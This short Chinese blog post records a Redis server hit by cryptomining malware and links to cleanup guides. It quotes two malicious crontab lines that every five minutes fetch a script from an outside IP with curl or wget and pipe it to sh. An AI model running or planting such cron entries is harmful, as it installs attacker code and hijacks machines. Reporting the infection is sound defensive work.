---
layout: post
title: "redis-挖矿病毒"
keywords: ["redis"]
description: "redis-挖矿病毒"
category: "redis"
tags: ["redis"]
---
{% include JB/setup %}

查木马参考链接：[http://www.bubuko.com/infodetail-1010815.html](http://www.bubuko.com/infodetail-1010815.html)

定时任务被改成了, cpu跑满
```
*/5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh
*/5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh
```

### 处理方案：
1.[https://blog.csdn.net/u012259256/article/details/79840356](https://blog.csdn.net/u012259256/article/details/79840356)
2.[http://www.361way.com/2t3ik-ddgs/5680.html](http://www.361way.com/2t3ik-ddgs/5680.html)
3.[https://blog.csdn.net/qq1137623160/article/details/70207348](https://blog.csdn.net/qq1137623160/article/details/70207348)